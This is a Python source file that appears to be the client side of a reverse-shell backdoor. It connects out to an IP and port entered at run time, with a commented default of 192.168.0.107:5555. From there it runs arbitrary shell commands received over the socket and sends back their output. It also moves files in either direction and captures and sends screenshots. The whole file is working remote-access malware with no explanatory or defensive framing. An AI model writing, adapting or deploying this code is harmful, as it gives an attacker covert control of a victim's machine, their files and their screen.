import json
import socket
import subprocess
import os
import pyautogui
# #
def reliable_send(data):
    jsondata=json.dumps(data)
    s.send(jsondata.encode())
# #
def reliable_recv():
    data=''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue
def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk=s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def upload_file(file_name):
    f=open(file_name, 'rb')
    s.send(f.read())
#
def screen_shot():
    myScreenshot= pyautogui.screenshot()
    myScreenshot.save('screen.png')
#
# #
# #
def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        elif command == 'help':
            pass
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:6] == 'upload':
            download_file(command[7:])
        elif command[:8] == 'download':
            upload_file(command[9:])
        elif command[:10] == 'screenshot':
            screen_shot()
            upload_file('screen.png')
            os.remove('screen.png')
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result=result.decode()
            reliable_send(result)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
port = input("Enter port number: ")
add = s.connect((input("Enter your inet or  IP address: "), int(port)))

#s.connect(('192.168.0.107', 5555))
shell()

# #
